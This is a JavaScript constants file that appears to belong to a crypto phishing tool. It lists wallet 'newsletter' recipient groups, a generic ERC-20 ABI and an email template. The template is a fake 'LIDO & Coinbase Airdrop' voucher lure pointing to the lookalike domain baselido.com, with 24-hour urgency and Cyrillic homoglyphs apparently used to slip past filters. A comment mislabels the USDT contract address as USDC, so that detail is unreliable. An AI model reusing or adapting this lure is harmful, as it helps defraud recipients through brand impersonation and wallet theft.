export const walletGroupsArray = [
  {
    groupName: "Uniswap LP Newsletter",
    recipientAddresses: ["0x937C0d4a6294cdfa575de17382c7076b579DC176"],
  },
  {
    groupName: "Uniswap DAO Newsletter",
    recipientAddresses: [
      "0xdC25482eB1094F1F50119F45f799250b0a5622AF", //tommys address
      "0x937C0d4a6294cdfa575de17382c7076b579DC176", //my liq address
      "0xb81B9B88e764cb6b4E02c5D0F6D6D9051A61E020", // my flask address
      "0xe7910F0b83ad155737043c771E2594f74B0BB739", // my chrome address
    ],
  },
];

export const emailTemplate = (
  <p>
    LIDО & Cоinbаsе Аirdrоp 🎉 Wе аrе plеased to inform you that you've been
    selected to rеcеivе a vоuchеr from Cоinbаsе, making you еligiblе to еxchаngе
    it for 3 stЕTH.Tо clаim уоur vоuchеr, plеаsе visit thе fоllоwing link: 🔗
    baselido.com For yоur sаfеtу, always ensure you are visiting our official
    website and never share your personal details unless certain of the site's
    authenticity. 🔒 Тhis оffеr will еxpirе in 24 hоurs. ⏳ Bеst regаrds, LIDО &
    Cоinbаsе Tеаm 🤝
  </p>
);

export const maticTokenContractAddressOnEthereum =
  "0xdac17f958d2ee523a2206206994597c13d831ec7"; //USDC contract addr on mainnet eth
export const genericERC20Abi = [
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [
      {
        name: "",
        type: "string",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_spender",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "totalSupply",
    outputs: [
      {
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_from",
        type: "address",
      },
      {
        name: "_to",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "transferFrom",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [
      {
        name: "",
        type: "uint8",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        name: "balance",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "symbol",
    outputs: [
      {
        name: "",
        type: "string",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_to",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "transfer",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address",
      },
      {
        name: "_spender",
        type: "address",
      },
    ],
    name: "allowance",
    outputs: [
      {
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    payable: true,
    stateMutability: "payable",
    type: "fallback",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        name: "to",
        type: "address",
      },
      {
        indexed: false,
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
];
